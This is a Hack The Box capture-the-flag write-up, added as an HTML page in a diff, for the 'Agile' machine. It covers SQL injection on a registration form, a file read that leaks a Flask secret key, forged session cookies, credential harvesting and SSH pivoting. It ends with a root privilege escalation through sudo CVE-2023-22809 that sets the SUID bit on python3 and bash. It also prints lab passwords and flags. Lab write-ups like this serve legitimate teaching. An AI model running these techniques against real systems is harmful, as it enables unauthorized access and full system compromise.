@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Agile Seasonal HTB - HTB Writeups</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Agile Seasonal HTB</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1678249485684"
+                  >2023-03-07 23:24</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1678289548556"
+                  >2023-03-08 10:32</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We start with nmap:<br />
+nmap -sC -sV 10.129.175.128</p>
+<p><img src="/_resources/2986101f5e234026aace7817bb09fa2b.png" /></p>
+<p>We do a banner grab:<br />
+<img src="/_resources/63038d002e314d0dae9a154bd4325ae7.png" /><br />
+We add superpass.htb to our /etc/hosts file</p>
+<p>We run a full scan in the backgound:<br />
+nmap -sC -sV -p- 10.129.175.128</p>
+<p>Looks like a password manager service:<br />
+<img src="/_resources/ad02c2b5ef2243f6b31d4f7e6386ab6b.png" /><br />
+There is a login page<br />
+<img src="/_resources/e41c3d0926124a9a9482ce3937772ef4.png" /></p>
+<p>We attempt to login as admin:admin but get a mysql error:<br />
+<img src="/_resources/10964ffa9bc8470cb17792e32303ce46.png" /></p>
+<p>We may have interrupted to the packet transfer and gotten this error, but it is useful since it gives us information about the backend. For instance, this error is a Werkzeug error, and we also see that the server is running python.<br />
+<img src="/_resources/b0e2ce48bd4c44f78a948d060e8d0170.png" /></p>
+<p>We attempt to register an account banana:banana</p>
+<p><img src="/_resources/227975f55ca24f30a3069eef31fff50c.png" /><br />
+Similarly we get an error:<br />
+<img src="/_resources/3f034451667d47e6b3e70afc27865409.png" /></p>
+<p>We can try some error based sql injection since we know that it's running MySQL</p>
+<p>We attempt to register with admin:admin‘ or 1=1    --+ and are able to create an account:<br />
+<img src="/_resources/0fa7c6d73c3140dc9e6fcb59d0195d9d.png" /></p>
+<p>We are able to add values and then the export function allows us to download files from the server with the values we put in.<br />
+<img src="/_resources/232064274caf468c8678e4104af5aa16.png" /></p>
+<p>The error gives us interesting information about where the server is sending us files from:<br />
+<img src="/_resources/8b68be499b36438082a41808279fc66e.png" /></p>
+<p>We intercept the download in use lfi to leak /app/app/superpass/app.py<br />
+<img src="/_resources/c3187543c385497181f05c3b42f01f45.png" /></p>
+<p>From there we can use the secret_key to generate cookies for other users. We use flask-unsign to decode our cookie:<br />
+<a title="https://github.com/Paradoxis/Flask-Unsign" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
+<p>flask-unsign --decode --cookie '.eJwljsFqwzAQRH9F7DkUSSvvav0VvZcQ1tIqNrhNsZxTyL9X0NMwvGF4L7i1XftqHeavF7hzBHxb73o3uMDnbtrN7Y-7237c-XBayoDuXLfufsfmA67v62WcHNZXmM_jaaNtFWZgREP0ylbEKpmmmBDFB2mMlLilFiMGqSoyaONMOUSORSPpotWYCqsoikplzySpUsuNfJTiU8rRQuZlqpITYdaJsHGYfKS6SBEa-rdnt-PfJnh4_wHiAEU2.ZAgWLw.2o-0IlG16ViEhEqNrPqLtxHyKH0' --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD</p>
+<p><img src="/_resources/8ca900b4bbda413090b84833cf068ec4.png" /></p>
+<p>Then we use flask-unsign to generate other cookies for users with different id #<br />
+flask-unsign --sign --cookie "{'_flashes': [('message', 'Please log in to access this page.')], '_fresh': True, '_id': '49db19ffeb8d7784424fd0cc587cadaa6adf43aab766b45eb9155904a9a356c64f0598e29fa68221cc2e9939547fe9069d5a87e1a6f68632da8a04915785097c', '_user_id': 'change this number to find'}" --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD</p>
+<p>User 1<br />
+<img src="/_resources/296e5c5ca4484056a50ccd62fd3f1dfd.png" /></p>
+<p>User 2<br />
+<img src="/_resources/b017177e4f3340ec9b8acb3cbae9fde7.png" /></p>
+<p>we can try these creds to ssh into the machine:<br />
+corum:5db7caa1d13cc37c9fc2<br />
+We try<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" corum@superpass.htb<br />
+We get the user.txt<br />
+<img src="/_resources/d7108acdcafa47b38d0b47089b1e4596.png" /><br />
+fe91ffb289d0e4448607ab6a20def12a</p>
+<p>In the box we see some internal ports listening:<br />
+<img src="/_resources/3a0003e1257d42c189d40060f385c6a4.png" /><br />
+There are also two other users on the machine:<br />
+<img src="/_resources/b905980b8f0f4b40b5a9305af3d71793.png" /></p>
+<p>We navigate the the /app directory and see some interesting files. We look at the test_and_update.sh script:<br />
+<img src="/_resources/7df14884f054413c83501169807c57c6.png" /><br />
+We have write permissions in the /app/app directory:<br />
+<img src="/_resources/1f9844eba681432b8b21eb3f9b162c4f.png" /></p>
+<p>ps aux shows us that chrome is running with --remote-debuggin-port flag which means we may be able to connect to this service from our machine:<br />
+<img src="/_resources/c0d8dfd7954d4c4f889a039b0eb708d1.png" /></p>
+<p>There is also a test app running on two ports that we can potentially port forward and connect to locally.<br />
+<img src="/_resources/375b64d21bdd473aa11a3806a041cb5e.png" /></p>
+<p>We try port forwarding the first unusual port 41829<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" corum@superpass.htb -L 41829:127.0.0.1:41829</p>
+<p>We verify that our port forward worked:<br />
+<img src="/_resources/0a372eb0d73a4181861569421413c98a.png" /></p>
+<p>First we need to install chrome, and then we can attempt to open this port manually:<br />
+We type chrome://inspect<br />
+<img src="/_resources/3e3a6ce61ad449cbb98ead979537cc3e.png" /><br />
+We configure the browser to use port 41829<br />
+<img src="/_resources/a3361949ef3a4cc08571c98793587c2f.png" /></p>
+<p>We see a page called test.superpass.htb:<br />
+<img src="/_resources/65cdb78ad5524963a7f6daa8f8eb4a3f.png" /></p>
+<p>We go to the vault page and see credentials for the user edwards:<br />
+<img src="/_resources/33683de156534480a30064f0b55b8ec1.png" /></p>
+<p>edwards:d07867c6267dcb5df0af<br />
+We can ssh into that user's account now:<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" edwards@superpass.htb</p>
+<p>Edwards has sudo rights:<br />
+<img src="/_resources/984ee81961b245e388e276f5fa0f423f.png" /></p>
+<p>We run the first command and find creds:<br />
+<img src="/_resources/cf5dcf3f77da48c2b691db510a7c82ef.png" /><br />
+edwards:1d7ffjwrx#$d6qn!9nndqgde4</p>
+<p>We run the second sudo command:<br />
+<img src="/_resources/6397996c16324bea8a4f15cc55880a96.png" /><br />
+"SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"</p>
+<p>We run pspy64 to see what the root user is doing to search for clues on how to exploit the sudoedit function.</p>
+<p>The root user is running /app/venv/bin/activate every other minute:<br />
+<img src="/_resources/4ebae6cb95a54d06a7e1bde07fe9faca.png" /><br />
+We can see that the root user and dev_admin user can both write to this file:<br />
+<img src="/_resources/1778bdc0e11b46bfb6c3b3eef4b24c43.png" /></p>
+<p>Apparently this machine requires us to exploit a new vulnerability with this version of sudo:<br />
+CVE-2023-22809<br />
+<a title="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf" href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf</a></p>
+<p><img src="/_resources/ee7fcd631cf4406d9fac9b35919e8d4b.png" /></p>
+<p>This vulnerability will allow us to change an environment variable to a path and then edit the file that is meant to run.</p>
+<p>First we change the environment variable:<br />
+export EDITOR='vim -- /app/venv/bin/activate'</p>
+<p>Then we edit one of the files we can edit using sudoedit by adding the following at the top:<br />
+chmod u+s /usr/bin/python3</p>
+<p>chmod u+s /bin/bash<br />
+<img src="/_resources/90914bf4c32a4dc1973101e44c33a3da.png" /></p>
+<p>We can see that the file was changed, and now we wait to check if the suid bit is set:<br />
+ls -l /usr/bin/python3.10<br />
+<img src="/_resources/2aebcb5c89c64b4080c1a8b188a72999.png" /></p>
+<p>Now we run the following commands to get a root shell:<br />
+python3 -q<br />
+import os<br />
+os.setuid(0)<br />
+os.system("su")<br />
+<img src="/_resources/c99d7f6240174e96afc493879b51519c.png" /><br />
+d53631abda604773de0ed8c5d685865b</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
